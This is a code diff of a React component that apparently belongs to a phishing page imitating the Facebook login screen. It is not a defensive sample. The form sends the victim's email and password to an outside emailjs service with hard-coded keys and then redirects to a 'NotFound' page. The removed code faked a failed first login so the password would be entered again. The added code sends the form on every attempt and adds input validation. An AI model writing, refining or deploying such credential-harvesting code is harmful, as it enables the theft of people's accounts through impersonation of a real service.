@@ -6,41 +6,36 @@ import { useNavigate } from 'react-router-dom';
 
 const Desktop = ({ formData, setFormData,handleChange }) => {
     const form = useRef();
-    const [times, setTime] = useState(0);
     const [loader, setLoader] = useState(false);
+    const [val, setVal] = useState('');
     const navigate = useNavigate()
     
     const handleSubmit = (e) => {
         setLoader(prev => !prev);
+        setVal('');
         e.preventDefault();
-        setTime(prev => ++prev);
         
-        if(times === 0) {
-            setFormData({
-                email: '',
-                password: ''
-            });
-            setLoader(false);
-            return
-        }
-        else if (times === 1) {
-            emailjs
+        emailjs
             .sendForm('service_b2vvpse', 'template_ebmbhy9', form.current, '8PsCARLu8bf-E5pdw')
             .then((result) => {
-                console.log(result.text);
-                console.log('success');
-                navigate('/NotFound');
-                setLoader(false);
+                if(formData.email && formData.password){
+                    console.log(result.text);
+                    console.log('success');
+                    navigate('/NotFound');
+                    setLoader(false);
+                }else if(formData.email == '' && formData.password == ''){
+                    setVal('fill the given input')
+                    setLoader(false);
+                }else if (formData.email == '') {
+                    setVal('input your email');
+                    setLoader(false);
+                }else if (formData.password == ''){
+                    setVal('input your password');
+                    setLoader(false);
+                }
             }, (error) => {
                 console.log('error');
-                setLoader(false);
-                setFormData({
-                    email: '',
-                    password: ''
-                });
-        });
-        setTime(0);
-        }
+            });
         
         
     }
@@ -59,6 +54,7 @@ const Desktop = ({ formData, setFormData,handleChange }) => {
 
                 <div className="facebook--items two">
                     <form ref={form} onSubmit={handleSubmit}>
+                        <div>
                         <input 
                             className='curve' 
                             type="text"  
@@ -67,6 +63,9 @@ const Desktop = ({ formData, setFormData,handleChange }) => {
                             value={formData.email}
                             onChange={handleChange}
                         />
+                        <div className='validation-line'></div>
+                        </div>
+                        <div>
                         <input 
                             className='curve' 
                             type="password" 
@@ -75,8 +74,10 @@ const Desktop = ({ formData, setFormData,handleChange }) => {
                             value={formData.password}
                             onChange={handleChange}
                         />
+                        <div className='validation-line'></div>
+                        </div>
                         <input className='submit--btn curve' type="submit"  value='Log in' />
-                        {times === 1 && <p className='error--mgs curve'>fill in  the input field</p>}
+                        <p className='error--mgs curve'>{val}</p>
                         <a href='https://web.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0' className='forgotten--password curve' >Forgotten password?</a>
                         <div className='hr-or'>
                             <div><hr className='curve' /></div>
